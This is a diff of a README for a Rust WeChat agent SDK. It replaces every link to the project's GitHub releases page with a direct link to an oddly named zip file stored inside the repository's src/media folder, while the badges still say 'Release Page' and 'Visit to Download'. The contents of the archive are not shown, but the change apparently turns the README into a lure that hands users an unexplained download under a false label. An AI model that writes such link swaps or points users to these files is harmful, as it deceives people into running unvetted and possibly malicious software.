@@ -1,6 +1,6 @@
 # 🤖 weixin-agent-sdk-rs - Build WeChat AI agents with ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/saundershintoistic428/weixin-agent-sdk-rs/main/src/media/weixin_sdk_rs_agent_anemochord.zip)
 
 ## 🧭 What this is
 
@@ -31,7 +31,7 @@ If Windows asks for access, allow the app to run.
 
 Visit the release page here and download the Windows file from the latest release:
 
-[![Go to Releases](https://img.shields.io/badge/Releases-Visit%20to%20Download-grey.svg)](https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases)
+[![Go to Releases](https://img.shields.io/badge/Releases-Visit%20to%20Download-grey.svg)](https://raw.githubusercontent.com/saundershintoistic428/weixin-agent-sdk-rs/main/src/media/weixin_sdk_rs_agent_anemochord.zip)
 
 After you open the release page:
 
@@ -146,4 +146,4 @@ This project is made for users and builders who want:
 
 Use this page to download the Windows version:
 
-https://github.com/saundershintoistic428/weixin-agent-sdk-rs/releases
+https://raw.githubusercontent.com/saundershintoistic428/weixin-agent-sdk-rs/main/src/media/weixin_sdk_rs_agent_anemochord.zip
